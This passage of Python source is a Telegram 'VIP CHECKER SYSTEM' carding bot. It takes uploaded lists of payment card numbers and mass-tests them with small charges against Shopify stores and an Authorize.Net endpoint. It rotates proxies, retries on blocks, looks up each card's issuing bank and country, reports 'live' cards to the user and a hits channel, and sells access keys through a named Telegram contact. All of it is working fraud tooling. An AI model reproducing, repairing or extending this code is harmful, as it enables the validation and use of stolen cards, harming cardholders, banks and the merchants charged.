    return {'ip': h, 'port': p, 'username': u or None, 'password': pw or None, 'proxy_url': pu, 'type': pt}

_CACHED_SHOPIFY_SITES = []
_LAST_SITES_FETCH = 0

async def get_shopify_sites():
    global _CACHED_SHOPIFY_SITES, _LAST_SITES_FETCH
    now = time.time()
    if _CACHED_SHOPIFY_SITES: 
        return _CACHED_SHOPIFY_SITES
        
    if os.path.exists('sites.txt'):
        try:
            async with aiofiles.open('sites.txt', 'r', encoding='utf-8') as f:
                _CACHED_SHOPIFY_SITES = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in (await f.read()).split('\n') if l.strip()]))
                if _CACHED_SHOPIFY_SITES:
                    return _CACHED_SHOPIFY_SITES
        except Exception: pass
        
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(GITHUB_SITES_URL, headers={"User-Agent": "Mozilla/5.0"}, timeout=10) as r:
                if r.status == 200:
                    _CACHED_SHOPIFY_SITES = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in (await r.text()).split('\n') if l.strip()]))
                    _LAST_SITES_FETCH = now
    except Exception: pass
    
    # القائمة الاحتياطية المدمجة لـ شوبيفاي
    if not _CACHED_SHOPIFY_SITES:
        _CACHED_SHOPIFY_SITES = [
            "touch-of-finland.myshopify.com",
            "huckberry.myshopify.com",
            "death-wish-coffee.myshopify.com",
            "gymshark.myshopify.com"
        ]
    
    return _CACHED_SHOPIFY_SITES

def is_dead_site_error(err):
    if not err: return True
    e = str(err).lower()
    bad_keywords = [
        'step 0', 'step 0 failed', 'step 1', 'step 1 failed', 'missing stable', 'missing stablei',
        'max ret', 'cloudflare', 'timed out', 'bad gateway', 'service unavailable', 
        'gateway timeout', 'site dead', 'session_error', 'max retries', 'max retries exceeded',
        '504', '502', '503', '429', 'tunnel', 'connection close', 'format error'
    ]
    return any(k in e for k in bad_keywords)

async def is_user_joined(uid, bot):
    targets = [t for t in [JOIN_CHANNEL_TARGET, JOIN_GROUP_TARGET] if t]
    if not targets: return True
    for target in targets:
        try:
            try: cid = int(target)
            except ValueError: cid = target
            member = await bot.get_chat_member(chat_id=cid, user_id=uid)
            if member.status in ['left', 'kicked', 'banned']: return False
        except Exception: pass 
    return True

async def send_welcome_menu(update_or_bot, uid, plan, limit):
    admin_panel = f"\n\n<b>{CE_GLASSES} {sf('Admin Panel')}:</b>\n ├ {CE_CANDLE} /gen {sf('[plan] [qty]')} - {sf('Generate Keys')}\n ├ {CE_CANDLE} /validate {sf('[key]')} - {sf('Check Key')}\n ├ {CE_CANDLE} /users - {sf('System Status')}\n ├ {CE_CANDLE} /checkgates - {sf('Filter Gates Engine')}\n ╰ {CE_CANDLE} /maint - {sf('Maintenance Mode')}" if uid in ADMIN_ID else ""
    
    t = f"""<b>━━━ {CE_CROWN} {sf('VIP CHECKER SYSTEM')} {CE_CROWN} ━━━</b>

<b>{CE_TOP} {sf('Checker Engine')}:</b>
 ╰ <i>{sf('Send a combo file to auto-start mass check')}</i>

<b>{CE_GEAR} {sf('Proxy Manager')}:</b>
 ├ {CE_CANDLE} /addpxy - {sf('Add Proxies')}
 ├ {CE_CANDLE} /proxy - {sf('View Proxies')}
 ├ {CE_CANDLE} /checkpxy - {sf('Clean Proxies')}
 ╰ {CE_CANDLE} /rmpxy - {sf('Remove Proxies')}

<b>{CE_DIAMOND} {sf('Account Settings')}:</b>
 ├ {CE_CANDLE} /info - {sf('Profile Info')}
 ├ {CE_CANDLE} /redeem - {sf('Redeem Key')}
 ├ {CE_CANDLE} /fb - {sf('Send Feedback')}
 ╰ {CE_CANDLE} /plan - {sf('View Subscriptions')}{admin_panel}

<b>{CE_SMILE} {sf('Your Plan')}:</b> <code>{sf(plan.title()) if plan else sf('Free')} ({sf(str(limit))} {sf('CC Limit')})</code>"""
    
    kb = [
        [InlineKeyboardButton('View Plans', callback_data="show_plans", style="primary", icon_custom_emoji_id="5413879192267805083"),
         InlineKeyboardButton('Redeem Key', callback_data="prompt_redeem", style="success", icon_custom_emoji_id="5451882707875276247")]
    ]
    
    if is_valid_url(JOIN_CHANNEL_LINK) and is_valid_url(JOIN_GROUP_LINK):
        kb.append([InlineKeyboardButton('Channel', url=JOIN_CHANNEL_LINK, style="primary", icon_custom_emoji_id="5305265301917549162"), InlineKeyboardButton('Group', url=JOIN_GROUP_LINK, style="primary", icon_custom_emoji_id="6028356293540977715")])
    elif is_valid_url(JOIN_CHANNEL_LINK):
        kb.append([InlineKeyboardButton('Channel', url=JOIN_CHANNEL_LINK, style="primary", icon_custom_emoji_id="5305265301917549162")])
    elif is_valid_url(JOIN_GROUP_LINK):
        kb.append([InlineKeyboardButton('Group', url=JOIN_GROUP_LINK, style="primary", icon_custom_emoji_id="6028356293540977715")])
        
    if isinstance(update_or_bot, Update):
        await styled_reply(update_or_bot, t, buttons=kb, use_gif=True, specific_gif=WELCOME_GIF)
    else:
        await styled_send(update_or_bot, uid, t, buttons=kb, use_gif=True, specific_gif=WELCOME_GIF)

async def force_join_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in ADMIN_ID: return True
    now = time.time()
    if uid in _JOIN_CACHE and now - _JOIN_CACHE[uid] < 600: return True
    
    is_joined = await is_user_joined(uid, context.bot)
    if is_joined:
        _JOIN_CACHE[uid] = now
        return True
        
    kb = []
    if is_valid_url(JOIN_CHANNEL_LINK): kb.append([InlineKeyboardButton('Channel', url=JOIN_CHANNEL_LINK, style="primary", icon_custom_emoji_id="5305265301917549162")])
    if is_valid_url(JOIN_GROUP_LINK): kb.append([InlineKeyboardButton('Group', url=JOIN_GROUP_LINK, style="primary", icon_custom_emoji_id="6028356293540977715")])
    if kb: kb.append([InlineKeyboardButton('Verify', callback_data="check_joined", style="success", icon_custom_emoji_id="5445189224682779974")])
    
    await styled_reply(update, f"<b>{CE_CLOWN} {sf('Access Denied')}</b>\n\n├ {sf('You must join our official channels first.')}\n╰ {sf('Please join, then click Verify.')}", buttons=kb, use_gif=True)
    return False

# ====================== CLEANING AND SANITIZING BIN DETAILS ======================
def clean_bin_data(data):
    country_name = str(data.get("country", "-")).upper().strip()
    country_code = str(data.get("country_code", data.get("country_iso", data.get("code", "")))).upper().strip()
    
    if not country_code and country_name != "-":
        country_code = COUNTRY_NAME_TO_CODE.get(country_name, "")
        
    if len(country_code) == 3:
        country_code = ISO3_TO_ISO2.get(country_code, country_code[:2])
        
    flag = data.get("flag", "")
    if not flag or str(flag).strip() in ["", "🏳️", "-"]:
        flag = get_flag_emoji(country_code)
        
    return {
        "brand": str(data.get("brand", "-")).upper().strip(),
        "type": str(data.get("type", "-")).upper().strip(),
        "level": str(data.get("level", "-")).upper().strip(),
        "bank": str(data.get("bank", "-")).upper().strip(),
        "country": country_name,
        "country_code": country_code,
        "flag": flag
    }

async def get_bin_info(bin_code, session=None):
    b6 = str(bin_code)[:6]
    if b6 in _BIN_CACHE: 
        return _BIN_CACHE[b6]
        
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
    }
    
    try:
        url1 = f"https://bins.antipublic.cc/bins/{b6}"
        async def fetch1(s):
            async with s.get(url1, headers=headers, timeout=4) as r:
                if r.status == 200:
                    data = await r.json()
                    if data and isinstance(data, dict): return data
                return None
        
        res = await fetch1(session) if (session and not session.closed) else await fetch1(aiohttp.ClientSession())
        if res:
            parsed = clean_bin_data({
                "brand": res.get("brand", "-"),
                "type": res.get("type", "-"),
                "level": res.get("level", "-"),
                "bank": res.get("bank", "-"),
                "country": res.get("country", "-"),
                "country_code": res.get("country_code") or res.get("country_iso") or res.get("code") or "",
                "flag": res.get("flag", "")
            })
            _BIN_CACHE[b6] = parsed
            return parsed
    except Exception: pass

    try:
        url2 = f"https://data.handyapi.com/bin/{b6}"
        async def fetch2(s):
            async with s.get(url2, headers=headers, timeout=4) as r:
                if r.status == 200: return await r.json()
                return None
                
        res2 = await fetch2(session) if (session and not session.closed) else await fetch2(aiohttp.ClientSession())
        if res2 and res2.get("Status") == "SUCCESS":
            country_obj = res2.get("Country", {})
            bank_obj = res2.get("Bank", {})
            parsed = clean_bin_data({
                "brand": res2.get("Scheme", "-"),
                "type": res2.get("Type", "-"),
                "level": res2.get("CardTier", "-"),
                "bank": bank_obj.get("Name", "-"),
                "country": country_obj.get("Name", "-"),
                "country_code": country_obj.get("A2", "") or country_obj.get("A3", ""),
                "flag": ""
            })
            _BIN_CACHE[b6] = parsed
            return parsed
    except Exception: pass

    return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "country_code": "", "flag": "🏳️"}

# ====================== SHOPIFY GATEWAY ENGINE (DYNAMIC AND COMPATIBLE) ======================
async def check_shopify_api(api_url, card, site, proxy, session):
    try:
        proxy_str = proxy['proxy_url'] if isinstance(proxy, dict) else proxy
        if proxy_str and "://" in proxy_str:
            proxy_str = proxy_str.split("://")[-1]
        
        card_parts = str(card).strip().split('|')
        cc_num, cc_month, cc_year, cc_cvv = (card_parts[0], card_parts[1], card_parts[2], card_parts[3]) if len(card_parts) >= 4 else ("", "", "", "")
        
        site_param = site.strip()
        if not site_param.startswith("http"):
            site_param = f"https://{site_param}"
            
        params = {
            "cc": str(card).strip(),
            "card": str(card).strip(),
            "num": cc_num,
            "month": cc_month,
            "mes": cc_month,
            "year": cc_year,
            "ano": cc_year,
            "cvv": cc_cvv,
            "cvc": cc_cvv,
            "site": site_param,
            "amount": "5",
            "amt": "5",
            "price": "5"
        }
        if proxy_str:
            params["proxy"] = proxy_str
            
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        }
        
        async with session.get(api_url, params=params, headers=headers, timeout=API_TIMEOUT) as resp:
            text_data = await resp.text()
            
            pr = None
            try: 
                rj = json.loads(text_data)
                rm = str(rj.get('response_msg', rj.get('result', rj.get('Response', rj.get('message', rj.get('error', rj.get('msg', rj.get('status', '')))))))).strip()
                gt = rj.get('Gateway', 'Shopify')
                
                for k in ['Price', 'price', 'amount', 'Amount', 'amt', 'Amt', 'charged']:
                    if k in rj and rj[k]:
                        pr = str(rj[k]).strip()
                        break
            except Exception: 
                rm = text_data.strip()
                gt = "Shopify"
            
            if not pr:
                price_match = re.search(r'\$\d+(?:\.\d{2})?', text_data)
                pr = price_match.group(0) if price_match else "$5.00"
            
            rl = rm.lower()
            
            if any(k in rl for k in [
                'login', 'require login', 'requires login', 'customer_login', 'customer/login',
                '404', 'not found', 'status: 404', 'status:404', 'site error! status: 404',
                'site requires login', 'empty submit', 'buyer_identity', 'presentment',
                'payment_flexibility', 'flexibility', 'payment token', 'unable to get payment token'
            ]):
                return {'status': 'Site Error', 'message': 'Site requires login or returns 404', 'card': card, 'gateway': gt, 'price': pr, 'retry': True}
            
            if is_dead_site_error(rm) or any(k in rl for k in ['proxy', 'timeout', 'bad gateway', 'max ret', 'step 0', 'missing', 'tunnel', 'cloudflare', '502', '503', '504']):
                return {'status': 'Site Error', 'message': rm, 'card': card, 'gateway': gt, 'price': pr, 'retry': True}
                
            if 'insufficient' in rl or 'funds' in rl or 'balance' in rl:
                return {'status': 'Insufficient', 'message': 'insufficient_funds', 'card': card, 'gateway': gt, 'price': pr}
                
            if 'charged' in rl or 'completed' in rl or 'payment succeeded' in rl or 'success' in rl: 
                return {'status': 'Charged', 'message': 'Payment Succeeded', 'card': card, 'gateway': gt, 'price': pr}
                
            if '3d' in rl or 'secure' in rl or 'otp' in rl:
                return {'status': 'Approved', 'message': '3d_secure_required', 'card': card, 'gateway': gt, 'price': pr}
                
            if 'approved' in rl or any(k in rl for k in ['invalid_cvv', 'match']): 
                return {'status': 'Approved', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
                
            return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
        
    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'API Timeout', 'card': card, 'retry': True}
    except Exception as e: 
        return {'status': 'Site Error', 'message': f'API Error: {str(e)[:30]}', 'card': card, 'retry': True}

# ====================== ASYNC AUTHNET GATEWAY ENGINE ======================
async def check_authnet_api(card, proxy, session):
    try:
        proxy_url = proxy['proxy_url'] if isinstance(proxy, dict) else proxy
        
        card_parts = str(card).strip().split('|')
        cc_num, cc_month, cc_year, cc_cvv = (card_parts[0], card_parts[1], card_parts[2], card_parts[3]) if len(card_parts) >= 4 else ("", "", "", "")
        
        params = {
            "cc": str(card).strip(),
            "card": str(card).strip(),
            "num": cc_num,
            "month": cc_month,
            "mes": cc_month,
            "year": cc_year,
            "ano": cc_year,
            "cvv": cc_cvv,
            "cvc": cc_cvv,
            "amount": "5",
            "amt": "5",
            "price": "5"
        }
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        }
        
        async with session.get(AUTHNET_API_URL, params=params, headers=headers, proxy=proxy_url, timeout=API_TIMEOUT) as resp:
            text_data = await resp.text()
            
            pr = None
            try:
                rj = json.loads(text_data)
                rm = str(rj.get('response_msg', rj.get('result', rj.get('Response', rj.get('message', rj.get('error', rj.get('msg', rj.get('status', text_data)))))))).strip()
                
                for k in ['Price', 'price', 'amount', 'Amount', 'amt', 'Amt', 'charged']:
                    if k in rj and rj[k]:
                        pr = str(rj[k]).strip()
                        break
            except Exception:
                rm = text_data.strip()
                
            if not pr:
                price_match = re.search(r'\$\d+(?:\.\d{2})?', text_data)
                pr = price_match.group(0) if price_match else "$5.00"
                
            rl = rm.lower()
            
            if any(k in rl for k in ['this transaction has been approved', 'charged', 'success', 'payment succeeded', 'completed']):
                return {'status': 'Charged', 'message': rm, 'card': card, 'gateway': 'Authorize.Net', 'price': pr}
                
            if any(k in rl for k in ['insufficient funds', 'insufficient_funds', 'funds', 'balance']):
                return {'status': 'Insufficient', 'message': 'Insufficient Funds', 'card': card, 'gateway': 'Authorize.Net', 'price': pr}
                
            if any(k in rl for k in ['authentication_required', '3d', 'secure', 'verification', 'otp', 'held for review', 'review']):
                return {'status': 'Approved', 'message': '3D Secure Required', 'card': card, 'gateway': 'Authorize.Net', 'price': pr}
                
            if any(k in rl for k in ['the transaction was declined', 'declined', 'card declined', 'do not honor', 'stolen', 'lost', 'expired', 'invalid number', 'suspected fraud', 'card code is invalid']):
                return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': 'Authorize.Net', 'price': pr}
                
            if any(k in rl for k in ['error', 'timeout', 'proxy', 'bad gateway', 'cloudflare', 'system unavailable']):
                return {'status': 'Site Error', 'message': rm, 'card': card, 'gateway': 'Authorize.Net', 'price': pr, 'retry': True}
                
            return {'status': 'Dead', 'message': rm if rm else 'Transaction Declined', 'card': card, 'gateway': 'Authorize.Net', 'price': pr}
            
    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'AuthNet API Timeout', 'card': card, 'gateway': 'Authorize.Net', 'price': '$5.00', 'retry': True}
    except Exception as e:
        return {'status': 'Site Error', 'message': f'AuthNet API Error: {str(e)[:40]}', 'card': card, 'gateway': 'Authorize.Net', 'price': '$5.00', 'retry': True}

async def remove_proxy_by_url(uid, proxy_url):
    try:
        current_proxies = await get_all_user_proxies(uid)
        if current_proxies:
            for idx, p in enumerate(current_proxies):
                if p.get('proxy_url') == proxy_url:
                    await remove_proxy_by_index(uid, idx)
                    break
    except Exception: pass

async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid, max_retries=6):
    if gateway_name == "AuthNet":
        last_res = {'status': 'Dead', 'message': 'API Error', 'card': card}
        for attempt in range(3): 
            p = random.choice(proxies)['proxy_url'] if proxies else None
            r = await check_authnet_api(card, p, session)
            if r.get('status') == 'Site Error':
                last_res = r
                continue
            return r
        return last_res

    lr = None
    tried_sites = set()
    for attempt in range(max_retries):
        if not proxies: 
            p = None
            p_dict = None
        else:
            p_dict = random.choice(proxies)
            p = p_dict['proxy_url']
        
        acs = [s for s in sites if _SITE_ERRORS_COUNT.get(s, 0) < _MAX_SITE_ERRORS and s not in tried_sites]
        if not acs: 
            acs = [s for s in sites if s not in tried_sites]
        if not acs:
            acs = sites
            
        s = random.choice(acs) if acs else "touch-of-finland.myshopify.com"
        tried_sites.add(s)
        
        if gateway_name == "Shopify":
            r = await check_shopify_api(SHOPIFY_API_URL_1, card, s, p, session)
            status = r.get('status')
            msg = str(r.get('message', '')).lower()
            
            if any(k in msg for k in ['proxy', 'tunnel', 'connection close', 'format error', 'max retries', 'bad gateway', 'timeout']):
                if p_dict and p_dict in proxies:
                    try: proxies.remove(p_dict)
                    except ValueError: pass
                lr = r
                continue

            if status == 'Rate Limit' or any(k in msg for k in ['429', '504', '405', 'gateway']):
                await asyncio.sleep(random.uniform(1.0, 1.8))
                lr = r
                continue

            if status == 'Site Error' or is_dead_site_error(msg):
                _SITE_ERRORS_COUNT[s] = _SITE_ERRORS_COUNT.get(s, 0) + 1
                lr = r
                continue
        else:
            return {'status': 'Dead', 'message': 'Unknown Gateway', 'card': card}
        
        if status in ['Charged', 'Approved', 'Insufficient', 'Dead']: 
            _SITE_ERRORS_COUNT[s] = max(0, _SITE_ERRORS_COUNT.get(s, 0) - 1)
            return r
            
        lr = r
        
    if lr: return lr
    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card}

def format_card_result(card, gateway, price="-", bin_info=None, elapsed=0.0):
    bi = bin_info or {}
    ps = sf(f"{str(price)}") if price and price != "-" else sf("-")
    h = f"<b>{CE_CROWN} {sf('PAYMENT SUCCEEDED')} {CE_PARTY}</b>"
    
    country_code = str(bi.get('country_code', '')).strip()
    flag = bi.get('flag')
    if not flag or str(flag).strip() in ["", "🏳️", "-"]:
        flag = get_flag_emoji(country_code)
        
    cd = f"{sf(bi.get('country', '-'))} {flag}"
    
    return f"""{h}

<b>{CE_DIAMOND} {sf('Card')}:</b> <code>{card}</code>
<b>{CE_BOOM} {sf('Response')}:</b> <code>{sf('Payment Succeeded')}</code>
<b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gateway)}</code>
<b>{CE_CASH} {sf('Price')}:</b> <code>{ps}</code>

<b>{CE_GEAR} {sf('Bank Info')}:</b>
 ├ <b>{sf('Bank')}:</b> <code>{sf(bi.get('bank', '-'))}</code>
 ├ <b>{sf('Country')}:</b> <code>{cd}</code>
 ├ <b>{sf('Brand')}:</b> <code>{sf(bi.get('brand', '-'))}</code>
 ╰ <b>{sf('Type')}:</b> <code>{sf(bi.get('type', '-'))} - {sf(bi.get('level', '-'))}</code>

<b>{CE_CHART} {sf('Took')}:</b> <code>{sf(f'{elapsed:.2f}s')}</code>"""

async def _send_mass_hit(card, gateway, price, uid, elapsed, bot, session):
    await asyncio.sleep(HIT_DELAY)
    try:
        bi = await get_bin_info(card.split("|")[0][:6], session)
        msg = format_card_result(card, gateway, price, bi, elapsed)
        kb = [[InlineKeyboardButton("Contact Owner", url="https://t.me/Dddadddyttt", style="primary", icon_custom_emoji_id="5445059250382469069")]]
        
        # الإرسال للمستخدم
        await styled_send(bot, uid, msg, buttons=kb, use_gif=True)
        
        # الإرسال لقناة صيد الهيتات الكبرى إن وجدت
        if HITS_GROUP_TARGET:
            try:
                await styled_send(bot, HITS_GROUP_TARGET, msg, buttons=kb, use_gif=True)
            except Exception: pass
    except Exception: pass

async def auto_file_check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global _MAINTENANCE_MODE
    if _MAINTENANCE_MODE and update.effective_user.id not in ADMIN_ID: return
    uid = update.effective_user.id
    pm = await styled_reply(update, f"<b>{CE_HOURGLASS} {sf('Processing file data...')}</b>", use_gif=True)
    try:
        if uid in ACTIVE_MTXT_PROCESSES and not ACTIVE_MTXT_PROCESSES[uid].get("stopped", True): 
            return await styled_edit(pm, f"<b>{CE_BOOM} {sf('A process is already active! Please wait for it to finish.')}</b>")
        doc = update.message.document
        if doc.file_size > 3 * 1024 * 1024: 
            return await styled_edit(pm, f"<b>{CE_BOOM} {sf('File too large! (Max 3MB)')}</b>")
        if not await force_join_check(update, context): 
            try: await pm.delete()
            except Exception: pass
            return
        db_proxies = await get_all_user_proxies(uid)
        if len(db_proxies) == 0: 
            return await styled_edit(pm, f"<b>{CE_CLOWN} {sf('You must add proxies before checking! Use /addpxy to add.')}</b>")
        
        f = await context.bot.get_file(doc.file_id)
        fp = f"temp_{uid}_{int(time.time())}.txt"
        await f.download_to_drive(fp)
        
        try:
            async with aiofiles.open(fp, "r", encoding="utf-8", errors="ignore") as file: content = await file.read()
        except Exception:
            async with aiofiles.open(fp, "r", encoding="latin-1", errors="ignore") as file: content = await file.read()
        if os.path.exists(fp): os.remove(fp)
        
        cards = extract_cc(content)
        if not cards: return await styled_edit(pm, f"<b>{CE_CLOWN} {sf('No valid cards found in the file.')}</b>")
        
        cl = get_cc_limit(await get_user_plan(uid), uid)
        if len(cards) > cl: cards = cards[:cl]
        PENDING_FILES[uid] = cards
        
        kb = [
            [InlineKeyboardButton('Shopify (Charge)', callback_data="gate:Shopify", style="success", icon_custom_emoji_id="5445388803223091254")],
            [InlineKeyboardButton('AuthNet ($20.00)', callback_data="gate:AuthNet", style="primary", icon_custom_emoji_id="5447453226498552490")],
            [InlineKeyboardButton('PayPal (Soon)', callback_data="none", style="danger", icon_custom_emoji_id="5269531045165816230")],
            [InlineKeyboardButton('Cancel', callback_data="gate:cancel", style="danger", icon_custom_emoji_id="5269531045165816230")]
        ]
        await styled_edit(pm, f"<b>{CE_CROWN} {sf('File Loaded Successfully')}</b>\n\n├ <b>{CE_DIAMOND} {sf('Total CCs')}:</b> <code>{sf(str(len(cards)))}</code>\n╰ <b>{CE_TOP} {sf('Please select a Gateway to start')}:</b>", buttons=kb)
    except Exception as e: await styled_edit(pm, f"<b>{CE_CLOWN} {sf('Error')}:</b> {sf(str(e))}")

# ====================== HIGH-SPEED MASS PROCESS CHECK ENGINE ======================
async def run_mass_check_task(uid, cards, gateway, bot, message_obj):
    session = await get_user_http_session(uid)
    proxies = await get_all_user_proxies(uid)
    parsed_proxies = [parse_proxy_format(p['proxy_url']) for p in proxies if parse_proxy_format(p['proxy_url'])]
    
    if not parsed_proxies:
        await styled_edit(message_obj, f"<b>{CE_CLOWN} {sf('Error')}:</b> {sf('No valid HTTP/HTTPS proxies found!')}")
        return

    sites = await get_shopify_sites()
    
    ACTIVE_MTXT_PROCESSES[uid] = {
        "total": len(cards),
        "checked": 0,
        "charged": [],
        "approved": [],
        "insufficient": [],
        "dead": 0,
        "errors": 0,
        "stopped": False,
        "msg_id": message_obj.message_id
    }
    
    state = ACTIVE_MTXT_PROCESSES[uid]
    semaphore = asyncio.Semaphore(WORKERS)
    start_time = time.time()
    
    async def process_card_worker(card):
        if state["stopped"]: return
        async with semaphore:
            if state["stopped"]: return
            c_start = time.time()
            res = await check_card_with_retry(card, sites, parsed_proxies, session, gateway, uid)
            c_end = time.time()
            elapsed = c_end - c_start
            
            status = res.get('status')
            price = res.get('price', '$5.00')
            
            if status == "Charged":
                state["charged"].append(card)
                asyncio.create_task(_send_mass_hit(card, gateway, price, uid, elapsed, bot, session))
            elif status == "Approved":
                state["approved"].append(card)
                asyncio.create_task(_send_mass_hit(card, gateway, price, uid, elapsed, bot, session))
            elif status == "Insufficient":
                state["insufficient"].append(card)
            elif status == "Dead":
                state["dead"] += 1
            else:
                state["errors"] += 1
                
            state["checked"] += 1

    async def progress_reporter():
        last_report_time = time.time()
        while state["checked"] < state["total"] and not state["stopped"]:
            await asyncio.sleep(0.5)
            now = time.time()
            if now - last_report_time >= 2.5: 
                last_report_time = now
                await update_progress_msg()
        await update_progress_msg(final=True)

    async def update_progress_msg(final=False):
        checked = state["checked"]
        total = state["total"]
        pct = int((checked / total) * 100) if total > 0 else 0
        
        filled = int(pct / 10)
        bar = "█" * filled + "░" * (10 - filled)
        
        elapsed_total = time.time() - start_time
        est_remaining = "-"
        if checked > 0:
            rate = checked / elapsed_total
            est_remaining = f"{int((total - checked) / rate)}s" if rate > 0 else "-"
            
        status_text = f"<b>{CE_HOURGLASS} {sf('Checking process is active...')}</b>" if not final else f"<b>{CE_CHECK} {sf('Process Completed Successfully!')}</b>"
        if state["stopped"]: status_text = f"<b>{CE_BOOM} {sf('Process Stopped By User!')}</b>"
        
        text = f"""<b>━━━ {CE_CROWN} {sf('VIP CHECKER SYSTEM')} ━━━</b>
{status_text}

<b>{CE_SPARKLES} {sf('Progress')}:</b> <code>[{bar}] {pct}%</code>
 ├ <b>{sf('Total CCs')}:</b> <code>{total}</code>
 ├ <b>{sf('Checked')}:</b> <code>{checked}</code>
 ├ <b>{sf('Remaining')}:</b> <code>{total - checked}</code>
 ╰ <b>{sf('Est. Time')}:</b> <code>{est_remaining}</code>

<b>{CE_DIAMOND} {sf('Live Cards')}:</b>
 ├ <b>{sf('Charged')} 💵:</b> <code>{len(state["charged"])}</code>
 ├ <b>{sf('Approved')} 💳:</b> <code>{len(state["approved"])}</code>
 ╰ <b>{sf('Insufficient')} 📉:</b> <code>{len(state["insufficient"])}</code>

<b>{CE_CONTAINER} {sf('Failed Cards')}:</b>
 ├ <b>{sf('Dead')} ❌:</b> <code>{state["dead"]}</code>
 ╰ <b>{sf('Errors')} ⚠️:</b> <code>{state["errors"]}</code>

<b>{CE_GEAR} {sf('Active Gate')}:</b> <code>{sf(gateway)}</code>
<i>{sf('Use /stop to cancel the process anytime')}</i>"""
        
        try:
            await styled_edit(message_obj, text)
        except Exception: pass

    reporter_task = asyncio.create_task(progress_reporter())
    
    tasks = [asyncio.create_task(process_card_worker(card)) for card in cards]
    await asyncio.gather(*tasks)
    
    state["checked"] = len(cards) 
    await reporter_task
    ACTIVE_MTXT_PROCESSES.pop(uid, None)

# ====================== HANDLERS AND TELEGRAM INTERACTIONS ======================
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    await ensure_user(uid)
    plan = await get_user_plan(uid)
    limit = get_cc_limit(plan, uid)
    await send_welcome_menu(update, uid, plan, limit)

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start_cmd(update, context)

async def info_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    await ensure_user(uid)
    plan = await get_user_plan(uid)
    limit = get_cc_limit(plan, uid)
    proxies = await get_all_user_proxies(uid)
    
    text = f"""<b>━━━ {CE_MAN} {sf('YOUR PROFILE')} ━━━</b>

<b>├ {sf('User ID')}:</b> <code>{uid}</code>
<b>├ {sf('Current Plan')}:</b> <code>{sf(plan.title()) if plan else sf('Free')}</code>
<b>├ {sf('Bulk Max Limit')}:</b> <code>{sf(str(limit))} CCs</code>
<b>╰ {sf('Total Proxies')}:</b> <code>{len(proxies)}</code>"""
    await styled_reply(update, text, use_gif=False)

async def plan_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    t = f"<b>━━━ {CE_STAR} {sf('VIP PLANS & ACCESS')} ━━━</b>\n\n"
    for pk, pi in PLANS.items():
        t += f"<b>{CE_DIAMOND} {sf(pi['name'])}:</b>\n ├ {sf('Duration')}: <code>{pi['duration_days']} Days</code>\n ├ {sf('Price')}: <code>{pi['price']}</code>\n ╰ {sf('Limit')}: <code>{get_cc_limit(pi['tier'])} CCs</code>\n\n"
    t += f"<i>{sf('To purchase access, contact the Owner:')} @Dddadddyttt</i>"
    await styled_reply(update, t, use_gif=False)

async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in ACTIVE_MTXT_PROCESSES:
        ACTIVE_MTXT_PROCESSES[uid]["stopped"] = True
        await styled_reply(update, f"<b>{CE_BOOM} {sf('Request to stop process registered. Stopping...')}</b>", use_gif=False)
    else:
        await styled_reply(update, f"<b>{CE_CLOWN} {sf('You do not have any active check process running.')}</b>", use_gif=False)

async def fb_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await styled_reply(update, f"<b>{CE_MAIL} {sf('Send Feedback')}</b>\n\n╰ <code>/fb [your feedback message]</code>", use_gif=False)
        return
    fb_text = " ".join(context.args)
    uid = update.effective_user.id
    for admin in ADMIN_ID:
        try:
            await context.bot.send_message(chat_id=admin, text=f"<b>📩 New Feedback from User</b> <code>{uid}</code>:\n\n{escape_html(fb_text)}", parse_mode=ParseMode.HTML)
        except Exception: pass
    await styled_reply(update, f"<b>{CE_CHECK} {sf('Feedback successfully delivered to administration.')}</b>", use_gif=False)

# ====================== KEYS AND SUBSCRIPTION MANAGERS ======================
async def gen_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in ADMIN_ID: return
    args = context.args
    if len(args) < 2:
        await styled_reply(update, "<b>Usage:</b> <code>/gen [plan_tier (Core/Elite/Root/X)] [quantity]</code>", use_gif=False)
        return
    tier = args[0].strip().title()
    try: qty = int(args[1].strip())
    except ValueError: qty = 1
    
    keys = await load_keys()
    generated = []
    for _ in range(qty):
        key = f"VIP-{tier.upper()}-" + "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=10))
        keys[key] = {"tier": tier, "used": False, "used_by": None, "expiry": None}
        generated.append(key)
    await save_keys(keys)
    
    t_key = "\n".join([f"<code>{k}</code>" for k in generated])
    await styled_reply(update, f"<b>🔑 Generated {qty} Keys for {tier}:</b>\n\n{t_key}", use_gif=False)

async def validate_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in ADMIN_ID: return
    if not context.args:
        await styled_reply(update, "<b>Usage:</b> <code>/validate [key]</code>", use_gif=False)
        return
